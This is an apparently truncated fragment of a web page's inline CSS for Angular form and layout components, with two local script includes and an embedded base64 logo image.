        .venecia-main-box.cardLayoutMode[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
            padding: 0
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
            max-width: none;
            padding: 3px 0 0
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20] {
                width: 100%;
                padding: 0 4px
            }

            .break-1024.venecia-main-box.cardLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20] {
                width: 100%;
                padding: 0 4px
            }

            .break-768.venecia-main-box.cardLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20] {
                width: 100%;
                padding: 0 4px
            }

            .break-0.venecia-main-box.cardLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20],
            .break-640.venecia-main-box.cardLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                padding: 3px 0 0
            }

            .venecia-main-form-content[_ngcontent-c20],
            .venecia-main-form-input[_ngcontent-c20],
            .venecia-main-form-textarea[_ngcontent-c20] {
                width: 100%;
                display: block
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20] {
                width: 100%;
                padding: 0 4px
            }

            .break-480.venecia-main-box.cardLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
                padding: 3px 0 0
            }
        }

        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
            width: 200px
        }

        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
            width: 275px
        }

        .backoffice [_nghost-c20] .dynamicRequest.venecia-main-box[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20],
        .backoffice [_nghost-c20] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
            padding: 0 0 6px;
            line-height: 30px;
            width: 60%
        }

        .backoffice [_nghost-c20] .requestDefinitionDisplayMode[_ngcontent-c20] label[_ngcontent-c20] .toggle_title[_ngcontent-c20] {
            font-size: 12px;
            color: #666
        }

        .backoffice [_nghost-c20] .requestDefinitionDisplayMode[_ngcontent-c20] label[_ngcontent-c20] .toggle-control[_ngcontent-c20] {
            margin-top: -21px;
            height: 22px;
            margin-left: 150px;
            background-color: #fff;
            border: 1px solid #c5c5c5;
            width: 3.2em
        }

        .backoffice [_nghost-c20] .requestDefinitionDisplayMode[_ngcontent-c20] label[_ngcontent-c20] .toggle-control[_ngcontent-c20]::after {
            background-color: #c5c5c5;
            margin-top: -1px
        }

        .backoffice [_nghost-c20] .requestDefinitionDisplayMode[_ngcontent-c20] label[_ngcontent-c20] .title[_ngcontent-c20] {
            margin-left: 200px;
            margin-top: -37px
        }

        .backoffice [_nghost-c20] .requestDefinitionDisplayMode[_ngcontent-c20] label[_ngcontent-c20] .noTitle[_ngcontent-c20] {
            margin-left: 200px
        }

        .backoffice [_nghost-c20] .requestDefinitionDisplayMode[_ngcontent-c20] label[_ngcontent-c20] input[_ngcontent-c20]:checked+.toggle-control[_ngcontent-c20] {
            border-color: #c5c5c5;
            background-color: #fff
        }

        .backoffice [_nghost-c20] .requestDefinitionDisplayMode[_ngcontent-c20] label[_ngcontent-c20] input[_ngcontent-c20]:checked+.toggle-control[_ngcontent-c20]:after {
            background-color: #ff4800
        }

        .backoffice [_nghost-c20] .recordGeneratorMode[_ngcontent-c20] .istanbul_form-container_input[_ngcontent-c20] {
            min-width: 40px !important;
            padding: 4px 8px 3px 4px !important
        }

        input[type=number][_ngcontent-c20]::-webkit-inner-spin-button,
        input[type=number][_ngcontent-c20]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            margin: 0
        }

        .venecia-main-box[_ngcontent-c20] {
            padding: 0 0 8px
        }

        .venecia-main-box.wrappedContentForm[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
            display: block
        }

        .venecia-main-box.userPendingApprovalsMode[_ngcontent-c20] {
            margin-top: 10px;
            padding-bottom: 0
        }

        .venecia-main-box.userPendingApprovalsMode[_ngcontent-c20] .auckland-label-top[_ngcontent-c20] {
            display: block;
            margin-bottom: 4px
        }

        .venecia-main-box.userPendingApprovalsMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
            display: none
        }

        .venecia-main-box.userPendingApprovalsMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] {
            display: block
        }

        .venecia-main-box.userPendingApprovalsMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
            width: 100%
        }

        .venecia-main-box.purposeTransfer[_ngcontent-c20] {
            width: 80%
        }

        .venecia-main-box.purposeTransfer[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20],
        .venecia-main-box.purposeTransfer[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
            display: block
        }

        .venecia-main-box.purposeTransfer[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
            width: 100%
        }

        .venecia-main-box-error[_ngcontent-c20] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            padding: 0;
            font-size: 12px;
            line-height: 10px;
            margin-top: 4px
        }

        .roma_basic_content_row[_ngcontent-c20] {
            min-height: 38px;
            padding: 0 12px 12px
        }

        .roma_basic_content_row_label[_ngcontent-c20] {
            display: block;
            color: #8a8a8a;
            font-size: 11px;
            font-family: dinMedium
        }

        .roma_basic_content_row_data[_ngcontent-c20] {
            display: block;
            color: #333;
            font-size: 14px;
            padding-top: 0
        }

        .form-break-content[_ngcontent-c20] .form-break-data[_ngcontent-c20],
        .form-break-content[_ngcontent-c20] .roma_basic_content_row_data[_ngcontent-c20],
        .roma_basic_content_row[_ngcontent-c20] .form-break-data[_ngcontent-c20],
        .roma_basic_content_row[_ngcontent-c20] .roma_basic_content_row_data[_ngcontent-c20] {
            line-height: 1.1;
            padding-top: 2px;
            white-space: pre-wrap
        }

        .form-break-content[_ngcontent-c20] .form-break-label[_ngcontent-c20],
        .form-break-content[_ngcontent-c20] .roma_basic_content_row_label[_ngcontent-c20],
        .roma_basic_content_row[_ngcontent-c20] .form-break-label[_ngcontent-c20],
        .roma_basic_content_row[_ngcontent-c20] .roma_basic_content_row_label[_ngcontent-c20] {
            vertical-align: top
        }

        @media only screen and (min-width:640px) {
            .venecia-main-form-label-data[_ngcontent-c20] {
                line-height: 30px
            }
        }

        @media screen and (max-width:1023px) and (min-width:768px) {
            .venecia-main-box.purposeTransfer[_ngcontent-c20] {
                width: auto
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .roma_basic_content_row[_ngcontent-c20] {
                padding: 0 0 8px
            }

            .venecia-main-box.purposeTransfer[_ngcontent-c20] {
                width: auto
            }
        }
    </style>
<script type="text/javascript" charset="utf-8" async="" src="css/0.197e40796b2bc5abe854.chunk.js"></script>
<script type="text/javascript" charset="utf-8" async="" src="css/1.0ab25f28e33ce495c497.chunk.js"></script>
<style>
        .split_sessionEnd[_ngcontent-c29] {
            display: none
        }

        .ipswich[_ngcontent-c29] {
            width: 940px;
            margin: -54px auto 0;
            border: 1px solid #e1e1e1;
            position: relative;
            background: #fff;
            min-height: 380px;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            -webkit-animation: .25s ipswich-animated-init;
            animation: .25s ipswich-animated-init;
            opacity: 1
        }

        @-webkit-keyframes ipswich-animated-init {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes ipswich-animated-init {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        .ipswich-advertising[_ngcontent-c29] {
            height: 380px;
            width: 360px
        }

        .ipswich-main-firm-data[_ngcontent-c29] {
            padding: 0 10px
        }

        .blackburn[_ngcontent-c29] {
            width: 940px;
            margin: 0 auto
        }

        .blackburn[_ngcontent-c29] i[_ngcontent-c29] {
            color: #666;
            display: inline-block;
            vertical-align: top;
            margin-right: 0;
            padding-top: 0
        }

        .blackburn-disclaimer[_ngcontent-c29] {
            color: #666;
            display: inline-block;
            width: calc(100% - 40px);
            font-size: 12px;
            vertical-align: top;
            line-height: 1.7
        }

        .blackburn.no-show[_ngcontent-c29] {
            display: none
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich[_ngcontent-c29] {
                width: 740px;
                margin: -54px auto 0;
                min-height: auto
            }

            .blackburn[_ngcontent-c29] {
                width: 740px
            }

            .ipswich-advertising[_ngcontent-c29] {
                width: 280px;
                height: auto
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .blackburn[_ngcontent-c29] {
                display: none
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .ipswich[_ngcontent-c29] {
                width: 100%;
                margin: -54px auto 0;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c29] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich[_ngcontent-c29] {
                width: 100%;
                margin: -160px auto 0;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c29] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich[_ngcontent-c29] {
                width: 100%;
                margin: -160px auto 0;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c29] {
                float: none;
                margin: auto;
                max-width: 100%
            }
        }

        .blackburn-interest-links[_ngcontent-c29] {
            padding: 10px 0
        }

        .interest-links[_ngcontent-c29] {
            text-align: left;
            font-size: 14px;
            display: inline-block
        }

        .interest-links-right[_ngcontent-c29] {
            text-align: right;
            font-size: 14px;
            float: right
        }

        .interest-links-link[_ngcontent-c29],
        .interest-links-link-right[_ngcontent-c29] {
            color: #0097c1;
            font-size: 14px;
            text-align: right;
            display: inline-block;
            cursor: pointer
        }

        .interest-links-link[_ngcontent-c29]:hover {
            color: #005b75;
            text-decoration: underline
        }

        .blackburn[_ngcontent-c29] {
            padding: 10px 14px 0
        }

        .blackburn[_ngcontent-c29] i.interest-links-icon[_ngcontent-c29] {
            display: inline-block;
            width: 30px;
            height: 30px;
            font-size: 16px;
            text-align: right;
            color: #0097c1;
            padding-top: 2px;
            margin-right: 2px
        }

        .blackburn.blackburn-mobile-links[_ngcontent-c29] {
            display: none
        }

        @media screen and (max-width:767px) and (min-width:320px) {
            .blackburn.blackburn-mobile-links[_ngcontent-c29] {
                display: block;
                width: 100%;
                padding: 5px 14px 10px
            }
        }

        .bots [_nghost-c29] .hideAlternativeWizard[_ngcontent-c29] {
            display: none
        }

        .bots [_nghost-c29] .ipswich[_ngcontent-c29] {
            height: 100%;
            border-bottom: 0
        }
    </style>
<style>
        .eindhoven[_ngcontent-c30] {
            border-bottom: 1px solid #e1e1e1
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] {
            background: #f2f2f2;
            display: table;
            width: 100%;
            table-layout: fixed;
            padding: 7px 10px 8px
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-left[_ngcontent-c30] {
            display: table-cell;
            text-align: left;
            vertical-align: middle;
            width: 40%
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-left[_ngcontent-c30] .eindhoven-logo[_ngcontent-c30] {
            width: 64px;
            height: 64px;
            padding: 10px 0 0 12px;
            background: #12447f;
            border-radius: 4px;
            display: inline-block;
            vertical-align: middle
        }

        .eindhoven[_ngcontent-c30] .eindhoven-content[_ngcontent-c30] .eindhoven-left[_ngcontent-c30] .eindhoven-logo[_ngcontent-c30] .eindhoven-logo-img[_ngcontent-c30] {
            width: 36px;
            height: 47px;
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAvCAYAAACLx2hbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDYwQUY3RDk3QzdGMTFFNzlFQkRCQkI0NzMyMzdDQ0QiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDYwQUY3RDg3QzdGMTFFNzlFQkRCQkI0NzMyMzdDQ0QiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QTVGNTRGQzg4MTlGMTFFNjgxRThDREU0MDJENkU4NUIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QTVGNTRGQzk4MTlGMTFFNjgxRThDREU0MDJENkU4NUIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5wYR+mAAAIl0lEQVR42rRZC2xb1Rn+78O+tpM4TuMkBNo8usD6UAOoIWOCToXQAnuygRhb9hBjXccmREFlm4Y2DW2aGNo0IdCQWEFICImH1k5Dgm5CSMuQIBud+khLmxZStDQ0IXGc+O37OPv+4+PEDUnjJM6JPl37+l6f737/9//nP47WsPcRIiFIMwwyrQAZfot8VhBHPxk+P5n+AFB4rQOGZZFh8nlLXqNpOuELaJERANYAYaAJaAfqgT8D06UXmrS6oxa4AugA1gOXAY1AsyL4FtC/WoQuUZNfCVytjuuUKtYC9zwIfL1ShDhW24DtQBdwLRBd4nfcDnwO6FsuIQO4DugVwtsOdGgFEy138PftXgYhgbiLu2D+e0CiUwiXyDNIuB50Yj7aSkL9TeCPwLtF2RccGmnIBPGYJ2jA87zHhQcyjkc4Et7j6IKjqIT/Hir1wQJctN1Q4wQmf4hcr4FJCCqQEa5bIAOm/L4C48vKg/OGrBlEnsOkOwXs4WFiTUIn4YCExqoYUiF53jVI0z1amZVknWIvOXMJbQRex1O3SiVECThM+NM9pZI6R16BYHn1cVGDG6YKEMnqKcRBGLVF6LOTIlzE77mas4k9A2qwmQ0+h/dc5WfMvSRWY8D/gPPAe8CTwIdm0TIgsM9znBbNQGgQHs8tCQdU8FyHDJ6U/aPzex2f4RrdIQ/ndVZJ+wQZNlgMzzs4mnOO5D1xWtdoEOeGXSEmgoY+3miZWU9cWBgbgLuAG2UYiiqokJSGTvpGMEEO1ex5+Rr36T6dk/A0tDyScb3+advt1zXtCERMfO2yWor6Tcqp2avw4B+k8/TXkTg1B3zkA1P+iAl9HriDpS4SIK+EjEpvD3VH82ZTnl9rrBYWZV14h+O5/Csp2+trtHyH8F2Zmxpr6Btr6yhmu5LANZEgQZHZLOZV1XHF7SC6b2iC3k/lqdrUJaEevl6GTYgLSBRgyPRmklRUTUgjj0Kd/aOp7HNxsv+9Y20DNVWH6NamGrq5KUxZKBYoEAgBLWqF36zWO07x/rBp7LpuTRVdFQ6Sw15UIePVN6gqckEBPDnphjSrZnDKGyrFXaSBOZLI5h9zde8F06LxH3eup/baGuqqr6G1IX9RgatAprjGdQIbAN8cf20BngL+W2XqF3hoErALN2gznpBq0GwI8YHteu6jpz+e/P2nG6PTt21opXs7O6je8pFl6JyynwG+CtyqVPCVkWk/Ar4/d7V/S/UrXVIjSFf0CMn0FuS47rtTtnO3FQgO3H/NZvpe5+W0sZ5bHdnTfAf4FrB1GbXnC0Arp3spoddUw9RViJooeAfh8ZDWwrb3pW13VzQcpl/e0E29nfzwss3Yq6prZIU9FD/Qr0vXsiHgGWCi4P9ZcyPF/zAcT+y6c3MHnbqvl3q3XM5X3A1wLfnpCskUx3dL+6iim5jU30qvsh372eHJqb33bN1ET93Ww5W4CaF8A3gWH9dVsNP8FPCl+V